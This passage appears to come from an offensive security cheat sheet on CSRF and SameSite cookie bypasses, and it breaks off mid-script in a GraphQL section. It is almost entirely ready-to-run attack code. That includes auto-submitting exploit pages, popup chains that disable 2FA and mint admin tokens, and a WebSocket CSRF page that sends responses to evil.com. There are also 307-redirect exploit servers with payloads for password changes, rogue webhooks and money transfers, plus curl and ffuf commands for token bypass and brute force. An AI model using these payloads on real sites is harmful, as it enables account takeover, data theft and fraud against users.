## SameSite Cookie Bypass Techniques

::caution
Modern browsers default to `SameSite=Lax` when no SameSite attribute is set. Lax blocks cross-site POST requests from carrying cookies, but several bypass techniques exist.
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Top-Level Navigation (Lax Bypass)"}
  ```html
  <!-- SameSite=Lax allows cookies on top-level GET navigations -->
  <!-- Combine with method override for POST-like effect -->

  <!-- Technique 1: window.location redirect -->
  <script>
  // If endpoint accepts GET or has method override via query param
  window.location = 'https://target.com/api/user/email?_method=POST&email=attacker@evil.com';
  </script>

  <!-- Technique 2: Anchor tag click simulation -->
  <a href="https://target.com/api/user/email?_method=POST&email=attacker@evil.com" id="go">
    Click here
  </a>
  <script>document.getElementById('go').click();</script>

  <!-- Technique 3: Meta refresh redirect -->
  <meta http-equiv="refresh" content="0;url=https://target.com/api/action?_method=POST&email=attacker@evil.com">

  <!-- Technique 4: Form GET with method override -->
  <form action="https://target.com/api/user/email" method="GET">
    <input name="_method" value="POST" type="hidden">
    <input name="email" value="attacker@evil.com" type="hidden">
  </form>
  <script>document.forms[0].submit();</script>

  <!-- Technique 5: window.open (new top-level browsing context) -->
  <script>
  // Opens in new window/tab - this IS a top-level navigation
  window.open('https://target.com/api/user/email?_method=POST&email=attacker@evil.com');
  </script>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Chrome 2-Minute Lax+POST Window"}
  ```html
  <!-- Chrome allows SameSite=Lax cookies on cross-site POST -->
  <!-- for 2 minutes after the cookie is set -->
  <!-- Exploit: Force re-authentication then immediately CSRF -->

  <html>
  <body>
  <script>
  // Phase 1: Force victim to re-authenticate
  // This works if the app has a "stay logged in" feature
  // or if session cookie is refreshed on activity

  // Option A: Open login page that sets new session cookie
  var authWin = window.open('https://target.com/oauth/authorize?client_id=legit&redirect_uri=https://target.com/callback');
  
  // Option B: Trigger SSO re-auth
  // var authWin = window.open('https://target.com/sso/login?prompt=none');

  // Phase 2: Wait for auth to complete, then CSRF within 2-min window
  setTimeout(function() {
    if (authWin) authWin.close();
    
    // POST CSRF now works because cookie was just set (< 2 minutes)
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://target.com/api/user/email';
    form.enctype = 'text/plain';
    
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = '{"email":"attacker@evil.com","p":"';
    input.value = '"}';
    form.appendChild(input);
    
    document.body.appendChild(form);
    form.submit();
  }, 5000); // 5 second delay for auth to complete
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Popup Window Technique"}
  ```html
  <!-- window.open creates a top-level browsing context -->
  <!-- POST form submissions in popups may bypass SameSite=Lax -->

  <html>
  <body>
  <script>
  // Technique 1: Open popup with form submission
  function csrfViaPopup() {
    var popup = window.open('', 'csrf_popup', 'width=1,height=1');
    
    popup.document.write(`
      <form action="https://target.com/api/user/email" method="POST" enctype="text/plain">
        <input name='{"email":"attacker@evil.com","p":"' value='"}' type="hidden">
      </form>
      <script>document.forms[0].submit();<\/script>
    `);
    popup.document.close();
    
    // Close popup after submission
    setTimeout(() => popup.close(), 2000);
  }

  csrfViaPopup();
  </script>

  <!-- Technique 2: Multiple popups for chained attacks -->
  <script>
  function chainedPopupCSRF() {
    var targets = [
      { url: 'https://target.com/api/user/email', body: '{"email":"attacker@evil.com","p":"="}' },
      { url: 'https://target.com/api/user/2fa', body: '{"enabled":false,"p":"="}' },
      { url: 'https://target.com/api/tokens', body: '{"name":"api","scope":"admin","p":"="}' }
    ];

    targets.forEach((t, i) => {
      setTimeout(() => {
        var p = window.open('', 'csrf_' + i, 'width=1,height=1');
        p.document.write(`
          <form action="${t.url}" method="POST" enctype="text/plain">
            <input name='${t.body.split('="')[0]}' value='${t.body.split('="')[1] || ''}' type="hidden">
          </form>
          <script>document.forms[0].submit();<\/script>
        `);
        p.document.close();
        setTimeout(() => p.close(), 1000);
      }, i * 1500);
    });
  }

  chainedPopupCSRF();
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="WebSocket CSRF (Bypasses All SameSite)"}
  ```html
  <!-- WebSocket handshakes send cookies regardless of SameSite attribute -->
  <!-- If application uses WebSocket for state-changing operations -->

  <html>
  <body>
  <script>
  // WebSocket CSRF - works against SameSite=Strict cookies
  var ws = new WebSocket('wss://target.com/ws/api');
  
  ws.onopen = function() {
    console.log('[+] WebSocket connected with victim cookies');
    
    // Attack 1: Change email
    ws.send(JSON.stringify({
      type: 'mutation',
      action: 'updateEmail',
      data: { email: 'attacker@evil.com' }
    }));
    
    // Attack 2: Escalate privileges
    ws.send(JSON.stringify({
      type: 'mutation',
      action: 'updateRole',
      data: { role: 'admin' }
    }));
    
    // Attack 3: Create API token
    ws.send(JSON.stringify({
      type: 'mutation',
      action: 'createToken',
      data: { name: 'backdoor', scope: 'full' }
    }));
    
    // Attack 4: Export data
    ws.send(JSON.stringify({
      type: 'query',
      action: 'exportUsers',
      data: { format: 'csv' }
    }));
  };
  
  ws.onmessage = function(event) {
    // Exfiltrate all responses to attacker server
    navigator.sendBeacon(
      'https://evil.com/ws-exfil',
      new Blob([event.data], { type: 'text/plain' })
    );
  };
  
  ws.onerror = function(error) {
    // Try alternative WebSocket paths
    var ws2 = new WebSocket('wss://target.com/socket');
    ws2.onopen = function() {
      ws2.send(JSON.stringify({ action: 'updateEmail', email: 'attacker@evil.com' }));
    };
  };
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Client-Side Redirect Chain"}
  ```html
  <!-- Combine open redirect on target.com with CSRF -->
  <!-- The redirect makes it a same-site navigation (bypasses SameSite=Lax) -->

  <html>
  <body>
  <script>
  // If target has open redirect: /redirect?url=/api/action
  // Step 1: Navigate to target's domain via redirect
  // Step 2: Redirect to API endpoint (now same-site)

  // Technique 1: GET method override via redirect chain
  window.location = 'https://target.com/redirect?url=' + 
    encodeURIComponent('/api/user/email?_method=POST&email=attacker@evil.com');

  // Technique 2: OAuth flow abuse
  // Many OAuth implementations redirect back to the app
  // Inject CSRF endpoint as redirect_uri
  window.location = 'https://target.com/oauth/authorize?' +
    'client_id=legit_client&' +
    'redirect_uri=' + encodeURIComponent('https://target.com/api/user/email?email=attacker@evil.com') +
    '&response_type=code';
  </script>
  </body>
  </html>

  <!-- Technique 3: Meta refresh with redirect chain -->
  <html>
  <head>
  <meta http-equiv="refresh" 
        content="0;url=https://target.com/goto?url=/api/settings?notifications=off&_method=POST">
  </head>
  </html>

  <!-- Technique 4: Clickjacking + redirect -->
  <html>
  <body>
  <div style="position:relative;width:500px;height:300px;">
    <iframe src="https://target.com/redirect?url=/api/delete-account" 
            style="opacity:0.01;position:absolute;top:0;left:0;width:100%;height:100%;z-index:2;">
    </iframe>
    <button style="position:absolute;top:50%;left:50%;z-index:1;font-size:24px;">
      Click to claim your prize!
    </button>
  </div>
  </body>
  </html>
  ```
  :::
::

## HTTP 307/308 Redirect Technique

::tip
HTTP 307 (Temporary Redirect) and 308 (Permanent Redirect) preserve the original request method and body during redirect. This allows converting a simple POST request (with `text/plain`) to the target while browsers follow the redirect with cookies.
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Python 307 Redirect Server"}
  ```python
  #!/usr/bin/env python3
  """307 redirect server for JSON CSRF exploitation.
  
  Attack flow:
  1. Victim visits attacker page
  2. Form submits POST to attacker server
  3. Attacker server responds with 307 redirect to target
  4. Browser follows redirect with same method (POST) and body
  5. Target receives POST with victim's cookies
  """

  from http.server import HTTPServer, BaseHTTPRequestHandler
  import sys

  TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else 'https://target.com/api/user/email'

  class RedirectHandler(BaseHTTPRequestHandler):
      def do_POST(self):
          # 307 preserves POST method and request body
          self.send_response(307)
          self.send_header('Location', TARGET_URL)
          self.send_header('Access-Control-Allow-Origin', '*')
          self.end_headers()
      
      def do_GET(self):
          self.send_response(200)
          self.send_header('Content-Type', 'text/html')
          self.end_headers()
          
          html = f'''<!DOCTYPE html>
  <html>
  <head><meta name="referrer" content="no-referrer"></head>
  <body>
  <h2>Loading...</h2>
  <form action="http://{self.headers['Host']}/" method="POST" enctype="text/plain">
    <input name='{{"email":"attacker@evil.com","p":"' value='"}}' type="hidden">
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>'''
          self.wfile.write(html.encode())
      
      def log_message(self, format, *args):
          print(f"[*] {self.client_address[0]} - {format % args}")

  port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
  print(f"[*] 307 redirect CSRF server on port {port}")
  print(f"[*] Target: {TARGET_URL}")
  print(f"[*] Deliver: http://YOUR_IP:{port}/")
  HTTPServer(('0.0.0.0', port), RedirectHandler).serve_forever()
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Node.js 307 Server"}
  ```javascript
  // 307 redirect CSRF server in Node.js
  const http = require('http');

  const TARGET = process.argv[2] || 'https://target.com/api/user/email';
  const PORT = process.argv[3] || 8080;

  const server = http.createServer((req, res) => {
    if (req.method === 'POST') {
      // 307 redirect preserves POST method and body
      res.writeHead(307, {
        'Location': TARGET,
        'Access-Control-Allow-Origin': '*'
      });
      res.end();
      console.log(`[+] Redirecting POST to ${TARGET}`);
    } else {
      // Serve the exploit page
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(`
        <!DOCTYPE html>
        <html>
        <head><meta name="referrer" content="no-referrer"></head>
        <body>
        <form action="/" method="POST" enctype="text/plain">
          <input name='{"email":"attacker@evil.com","p":"' value='"}' type="hidden">
        </form>
        <script>document.forms[0].submit();</script>
        </body>
        </html>
      `);
    }
  });

  server.listen(PORT, () => {
    console.log(`[*] 307 CSRF server: http://0.0.0.0:${PORT}`);
    console.log(`[*] Redirecting to: ${TARGET}`);
  });
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Flask 307 Server"}
  ```python
  #!/usr/bin/env python3
  """Flask-based 307 redirect CSRF server with multiple endpoint support"""

  from flask import Flask, redirect, request, render_template_string
  import sys

  app = Flask(__name__)

  TARGETS = {
    'email': 'https://target.com/api/user/email',
    'password': 'https://target.com/api/user/password',
    'role': 'https://target.com/api/user/role',
    'token': 'https://target.com/api/tokens',
    'webhook': 'https://target.com/api/webhooks',
    'transfer': 'https://target.com/api/transfer',
  }

  PAYLOADS = {
    'email': '{"email":"attacker@evil.com","p":"',
    'password': '{"password":"Hacked123!","confirm":"Hacked123!","p":"',
    'role': '{"role":"admin","p":"',
    'token': '{"name":"backdoor","scope":"admin","p":"',
    'webhook': '{"url":"https://evil.com/exfil","events":["*"],"p":"',
    'transfer': '{"to":"ATTACKER_ACCT","amount":9999,"p":"',
  }

  @app.route('/<action>', methods=['POST'])
  def handle_redirect(action):
      if action in TARGETS:
          return redirect(TARGETS[action], code=307)
      return 'Not found', 404

  @app.route('/<action>', methods=['GET'])
  def serve_exploit(action):
      if action not in TARGETS:
          return 'Not found', 404
      
      payload_name = PAYLOADS.get(action, '{"test":"probe","p":"')
      
      return render_template_string('''
      <!DOCTYPE html>
      <html>
      <head><meta name="referrer" content="no-referrer"></head>
      <body>
      <form action="/{{ action }}" method="POST" enctype="text/plain">
        <input name='{{ payload }}' value='"}' type="hidden">
      </form>
      <script>document.forms[0].submit();</script>
      </body>
      </html>
      ''', action=action, payload=payload_name)

  @app.route('/')
  def index():
      links = ''.join(f'<li><a href="/{a}">{a} → {t}</a></li>' for a, t in TARGETS.items())
      return f'<h2>CSRF 307 Redirect Server</h2><ul>{links}</ul>'

  if __name__ == '__main__':
      app.run(host='0.0.0.0', port=int(sys.argv[1]) if len(sys.argv) > 1 else 8080)
  ```
  :::
::

## Framework-Specific Body Parser Exploitation

::accordion
  :::accordion-item{icon="i-lucide-server" label="Express.js / Node.js"}
  ```bash
  # Express with body-parser configurations that enable CSRF:

  # Config 1: app.use(bodyParser.json({ type: '*/*' }))
  # Accepts ANY content-type and parses as JSON
  curl -X POST https://target.com/api/update \
    -H "Content-Type: text/plain" \
    -H "Cookie: session=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # Config 2: app.use(express.json()) with no type restriction
  # Default accepts application/json only, but check:
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # Config 3: Custom middleware that reads raw body
  curl -X POST https://target.com/api/update \
    -H "Content-Type: text/plain" \
    -H "Cookie: session=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # Config 4: body-parser with extended qs parsing
  # user[email]=attacker@evil.com becomes {user:{email:"attacker@evil.com"}}
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: session=VICTIM" \
    -d 'user[email]=attacker@evil.com&user[role]=admin'

  # Config 5: express-graphql without CSRF protection
  curl -X POST https://target.com/graphql \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: session=VICTIM" \
    -d 'query=mutation{updateEmail(email:"attacker@evil.com"){success}}'

  # Test all content types systematically
  for ct in "text/plain" "application/x-www-form-urlencoded" "text/html" \
            "text/xml" "application/xml" "multipart/form-data" \
            "application/octet-stream" "text/csv"; do
    echo -n "Content-Type: $ct → "
    curl -s -o /dev/null -w "%{http_code}" \
      -X POST "https://target.com/api/update" \
      -H "Content-Type: $ct" \
      -H "Cookie: session=VICTIM" \
      -d '{"email":"attacker@evil.com"}'
    echo ""
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-server" label="Django / Django REST Framework"}
  ```bash
  # Django REST Framework CSRF bypass scenarios:

  # Scenario 1: SessionAuthentication without CSRF enforcement
  # DRF disables CSRF for non-session auth, but if misconfigured:
  curl -X POST https://target.com/api/update/ \
    -H "Content-Type: application/json" \
    -H "Cookie: sessionid=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # Scenario 2: @csrf_exempt decorator on API view
  curl -X POST https://target.com/api/update/ \
    -H "Content-Type: text/plain" \
    -H "Cookie: sessionid=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # Scenario 3: CSRF middleware disabled globally
  # settings.py: MIDDLEWARE without 'django.middleware.csrf.CsrfViewMiddleware'
  curl -X POST https://target.com/api/update/ \
    -H "Content-Type: text/plain" \
    -H "Cookie: sessionid=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # Scenario 4: DRF content negotiation - parsers accepting multiple types
  curl -X POST https://target.com/api/update/ \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: sessionid=VICTIM" \
    -d 'email=attacker@evil.com'

  # Scenario 5: DRF with JSONParser + FormParser
  curl -X POST https://target.com/api/update/ \
    -H "Content-Type: multipart/form-data" \
    -H "Cookie: sessionid=VICTIM" \
    -F 'email=attacker@evil.com'

  # Scenario 6: Django channels WebSocket CSRF
  # WebSocket connections don't enforce CSRF
  # See WebSocket CSRF section
  ```
  :::

  :::accordion-item{icon="i-lucide-server" label="Flask / FastAPI"}
  ```bash
  # Flask: request.get_json(force=True) parses any Content-Type as JSON
  curl -X POST https://target.com/api/update \
    -H "Content-Type: text/plain" \
    -H "Cookie: session=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # Flask: request.json property (requires correct Content-Type)
  # But force=True bypasses this:
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: session=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # Flask: request.get_json(force=True, silent=True)
  # Even more permissive - never raises errors
  curl -X POST https://target.com/api/update \
    -H "Content-Type: text/html" \
    -H "Cookie: session=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # FastAPI: automatic content-type negotiation
  # Pydantic models may accept form data as well
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: session=VICTIM" \
    -d 'email=attacker@evil.com&role=admin'

  # FastAPI: Body(..., media_type="application/json")
  # If not specified, may accept any type
  curl -X POST https://target.com/api/update \
    -H "Content-Type: text/plain" \
    -H "Cookie: session=VICTIM" \
    -d '{"email":"attacker@evil.com"}'
  ```
  :::

  :::accordion-item{icon="i-lucide-server" label="Spring Boot / Java"}
  ```bash
  # Spring MVC: CSRF disabled for API endpoints
  # http.csrf().ignoringAntMatchers("/api/**")
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: JSESSIONID=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # Spring: @RequestBody accepts JSON regardless of Content-Type
  # if HttpMessageConverter is configured permissively
  curl -X POST https://target.com/api/update \
    -H "Content-Type: text/plain" \
    -H "Cookie: JSESSIONID=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # Spring: Form parameter binding
  # @ModelAttribute or implicit binding
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: JSESSIONID=VICTIM" \
    -d 'email=attacker@evil.com&role=ADMIN'

  # Spring WebFlux: Reactive endpoints may have different CSRF handling
  curl -X POST https://target.com/api/reactive/update \
    -H "Content-Type: text/plain" \
    -H "Cookie: SESSION=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # Charset encoding manipulation
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json;charset=UTF-7" \
    -H "Cookie: JSESSIONID=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # Spring: Content-Type with boundary parameter
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json; boundary=something" \
    -H "Cookie: JSESSIONID=VICTIM" \
    -d '{"email":"attacker@evil.com"}'
  ```
  :::

  :::accordion-item{icon="i-lucide-server" label="ASP.NET Core / C#"}
  ```bash
  # ASP.NET: Missing [ValidateAntiForgeryToken]
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: .AspNetCore.Session=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # ASP.NET: API controllers without antiforgery
  # [ApiController] attribute skips antiforgery by default
  curl -X POST https://target.com/api/update \
    -H "Content-Type: text/plain" \
    -H "Cookie: .AspNetCore.Session=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # ASP.NET: Model binding from form data
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: .AspNetCore.Session=VICTIM" \
    -d 'Email=attacker@evil.com&Role=Admin'

  # ASP.NET: Content negotiation with Accept header
  curl -X POST https://target.com/api/update \
    -H "Content-Type: text/plain" \
    -H "Accept: application/json" \
    -H "Cookie: .AspNetCore.Session=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # ASP.NET: SignalR WebSocket CSRF
  # SignalR hubs accept WebSocket connections with cookies
  ```
  :::

  :::accordion-item{icon="i-lucide-server" label="Ruby on Rails"}
  ```bash
  # Rails: protect_from_forgery disabled or except for API
  # skip_before_action :verify_authenticity_token
  curl -X POST https://target.com/api/update.json \
    -H "Content-Type: application/json" \
    -H "Cookie: _session_id=VICTIM" \
    -d '{"user":{"email":"attacker@evil.com"}}'

  # Rails: API-only mode (config.api_only = true)
  # CSRF protection not included by default
  curl -X POST https://target.com/api/update \
    -H "Content-Type: text/plain" \
    -H "Cookie: _session_id=VICTIM" \
    -d '{"user":{"email":"attacker@evil.com"}}'

  # Rails: Strong parameters via URL-encoded form
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: _session_id=VICTIM" \
    -d 'user[email]=attacker@evil.com&user[role]=admin'

  # Rails: JSONP endpoint (if exists)
  # GET with callback parameter
  curl "https://target.com/api/user.json?callback=attacker_func"

  # Rails: Method override via _method parameter
  curl -X POST https://target.com/api/users/1 \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: _session_id=VICTIM" \
    -d '_method=PUT&user[role]=admin'
  ```
  :::

  :::accordion-item{icon="i-lucide-server" label="Go (Gin, Echo, Fiber)"}
  ```bash
  # Go Gin: ShouldBindJSON accepts JSON from any Content-Type if called
  curl -X POST https://target.com/api/update \
    -H "Content-Type: text/plain" \
    -H "Cookie: session=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # Go Echo: Bind() auto-detects content type
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: session=VICTIM" \
    -d 'email=attacker@evil.com'

  # Go Fiber: BodyParser accepts multiple formats
  curl -X POST https://target.com/api/update \
    -H "Content-Type: text/plain" \
    -H "Cookie: session=VICTIM" \
    -d '{"email":"attacker@evil.com"}'

  # Go: No built-in CSRF protection in most frameworks
  # Developers must explicitly add middleware
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VICTIM" \
    -d '{"email":"attacker@evil.com"}'
  ```
  :::
::

## CSRF Token Bypass Techniques

### Token Validation Weaknesses

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Token Removal"}
  ```bash
  # Test 1: Remove CSRF token header entirely
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"email":"attacker@evil.com"}'

  # Test 2: Remove token from request body
  # Original: {"email":"new@test.com","_token":"abc123"}
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"email":"attacker@evil.com"}'

  # Test 3: Remove token cookie
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "X-CSRF-Token: valid_token" \
    -H "Cookie: session=VALID" \
    -d '{"email":"attacker@evil.com"}'
  # Note: Cookie without csrf= part

  # Test 4: Send empty token
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "X-CSRF-Token: " \
    -H "Cookie: session=VALID" \
    -d '{"email":"attacker@evil.com"}'

  # Test 5: Token as null/undefined in body
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"email":"attacker@evil.com","_token":null}'

  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"email":"attacker@evil.com","_token":"undefined"}'
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Token Type Juggling"}
  ```bash
  # Type confusion attacks against token validation
  
  # Boolean true
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"email":"attacker@evil.com","csrf_token":true}'

  # Boolean false
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"email":"attacker@evil.com","csrf_token":false}'

  # Integer 0
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"email":"attacker@evil.com","csrf_token":0}'

  # Integer 1
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"email":"attacker@evil.com","csrf_token":1}'

  # Empty array
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"email":"attacker@evil.com","csrf_token":[]}'

  # Empty object
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"email":"attacker@evil.com","csrf_token":{}}'

  # Empty string
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"email":"attacker@evil.com","csrf_token":""}'

  # Null
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"email":"attacker@evil.com","csrf_token":null}'

  # Array with empty string
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VALID" \
    -d '{"email":"attacker@evil.com","csrf_token":[""]}'
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Cross-User Token Swap"}
  ```bash
  # Test if CSRF tokens are globally valid (not tied to session)
  
  # Step 1: Get token from attacker's own session
  ATTACKER_TOKEN=$(curl -s https://target.com/api/csrf \
    -H "Cookie: session=ATTACKER_SESSION" | jq -r '.token')
  echo "[+] Attacker token: $ATTACKER_TOKEN"

  # Step 2: Use attacker's token with victim's session
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "X-CSRF-Token: $ATTACKER_TOKEN" \
    -H "Cookie: session=VICTIM_SESSION" \
    -d '{"email":"attacker@evil.com"}'

  # Step 3: Test token from different endpoint
  PROFILE_TOKEN=$(curl -s https://target.com/profile \
    -H "Cookie: session=ATTACKER_SESSION" | \
    grep -oP 'csrf[_-]?token["\s:=]+\K[a-zA-Z0-9_-]+')
  
  curl -X POST https://target.com/api/transfer \
    -H "Content-Type: application/json" \
    -H "X-CSRF-Token: $PROFILE_TOKEN" \
    -H "Cookie: session=VICTIM_SESSION" \
    -d '{"to":"attacker","amount":10000}'

  # Step 4: Test old/expired tokens
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "X-CSRF-Token: PREVIOUSLY_CAPTURED_OLD_TOKEN" \
    -H "Cookie: session=VALID" \
    -d '{"email":"attacker@evil.com"}'
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Double Submit Cookie Bypass"}
  ```bash
  # Double-submit pattern: cookie value must match header/body value
  # If you can set cookies on any subdomain → full bypass

  # Method 1: CRLF injection to set cookie
  curl "https://target.com/redirect?url=https://target.com%0d%0aSet-Cookie:%20csrf=attacker_value;%20Domain=.target.com;%20Path=/" \
    -v

  # Method 2: Subdomain cookie injection
  # If you control any subdomain of target.com:
  # On your-sub.target.com:
  # document.cookie = "csrf=controlled_value; domain=.target.com; path=/"

  # Method 3: XSS on subdomain for cookie setting
  # Find XSS on any *.target.com subdomain
  # Inject: document.cookie="csrf=pwned; domain=.target.com; path=/"

  # Then send CSRF with matching header and cookie:
  curl -X POST https://target.com/api/update \
    -H "Content-Type: application/json" \
    -H "X-CSRF-Token: controlled_value" \
    -H "Cookie: session=VICTIM; csrf=controlled_value" \
    -d '{"email":"attacker@evil.com"}'

  # Method 4: Cookie tossing (sibling subdomain)
  # Register app.target.com (if available)
  # Set: document.cookie = "csrf=evil; domain=target.com"
  # This cookie may override the legitimate csrf cookie
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Token Prediction & Brute Force"}
  ```bash
  # Collect multiple tokens to identify patterns
  for i in $(seq 1 20); do
    token=$(curl -s https://target.com/api/csrf \
      -H "Cookie: session=TEST_SESSION" | jq -r '.token')
    echo "Token $i: $token"
    sleep 1
  done | tee tokens.txt

  # Analyze token entropy
  cat tokens.txt | awk '{print $3}' | while read token; do
    echo -n "Length: ${#token} | "
    echo -n "Charset: "
    echo "$token" | grep -oP '.' | sort -u | tr -d '\n'
    echo ""
  done

  # Check if tokens are sequential or time-based
  python3 -c "
  import sys
  tokens = [line.split(': ')[1].strip() for line in open('tokens.txt')]
  for i in range(len(tokens)-1):
    try:
      diff = int(tokens[i+1], 16) - int(tokens[i], 16)
      print(f'Diff {i}→{i+1}: {diff}')
    except:
      print(f'Non-numeric token format')
      break
  "

  # Brute force short tokens
  # If token is 4-6 chars, brute force is feasible
  ffuf -u https://target.com/api/update \
    -X POST \
    -H "Content-Type: application/json" \
    -H "Cookie: session=VICTIM" \
    -d '{"email":"attacker@evil.com","csrf_token":"FUZZ"}' \
    -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt \
    -mc 200,201,204 \
    -t 50
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Token Fixation"}
  ```bash
  # Test if attacker can set/fix the CSRF token value

  # Step 1: Login and get a session with known CSRF token
  RESPONSE=$(curl -s -c cookies.txt https://target.com/login \
    -X POST -d "user=attacker&pass=attacker_pass")
  
  # Extract CSRF token
  CSRF=$(cat cookies.txt | grep csrf | awk '{print $NF}')
  echo "[+] Fixed CSRF token: $CSRF"

  # Step 2: Set this CSRF cookie on victim's browser
  # Via XSS, CRLF injection, or subdomain control
  # document.cookie = "csrf=$CSRF; domain=.target.com; path=/"

  # Step 3: Use the known/fixed token in CSRF attack
  # Since attacker knows the value, include it in the exploit page

  cat > exploit.html << PAYLOAD
  <html>
  <body>
  <script>
  // Set the known CSRF cookie (if subdomain XSS available)
  // document.cookie = "csrf=${CSRF}; domain=.target.com; path=/";

  fetch('https://target.com/api/update', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'text/plain'
    },
    body: JSON.stringify({
      email: 'attacker@evil.com',
      csrf_token: '${CSRF}'
    })
  });
  </script>
  </body>
  </html>
  PAYLOAD
  ```
  :::
::

## Protocol & API-Specific Attacks

### GraphQL CSRF

::tabs
  :::tabs-item{icon="i-lucide-code" label="Mutation via text/plain"}
  ```html
  <!-- GraphQL mutation via text/plain form submission -->
  <html>
  <head><meta name="referrer" content="no-referrer"></head>
  <body>
  <form action="https://target.com/graphql" method="POST" enctype="text/plain">
    <input type="hidden"
      name='{"query":"mutation { updateUser(input: { email: \"attacker@evil.com\" }) { id email } }","p":"'
      value='"}' />
  </form>
  <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Mutation via GET"}
  ```html
  <!-- Some GraphQL servers accept queries/mutations via GET -->
  <script>
  // GraphQL over GET - no CORS preflight for GET requests
  var img = new Image();
  img.src = 'https://target.com/graphql?query=' + 
    encodeURIComponent('mutation { updateUser(input: { email: "attacker@evil.com" }) { id } }');
  document.body.appendChild(img);
  </script>

  <!-- Multiple mutations via GET -->
  <script>
  var mutations = [
    'mutation{updateEmail(email:"attacker@evil.com"){ok}}',
    'mutation{disable2FA{ok}}',
    'mutation{createApiKey(name:"backdoor",scope:"admin"){key}}',
  ];

  mutations.forEach(m => {
